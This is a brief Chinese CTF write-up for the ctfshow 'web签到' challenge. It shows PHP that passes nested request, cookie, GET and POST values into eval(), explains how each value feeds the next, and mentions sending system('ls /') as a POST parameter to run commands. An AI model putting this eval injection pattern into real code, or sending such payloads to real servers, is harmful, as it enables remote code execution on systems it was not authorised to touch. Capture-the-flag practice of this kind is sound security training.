# web签到
```php
eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
/*
    # $_REQUEST 能够获取get，post，cookie中的消息
    # $_COOKIE 获取cookie中的值，此题中获取CTFshow-QQ群的值
    # $_POST 获取cookie的名的值
    # $_GET 获取post对应的值
*/
```
构造如下请求（不知道request c[][]...[]=system('ls /');命令放在get处无法执行。。。，改到post处就可以）
![pic1](/ctfshow/image/image-1.png)
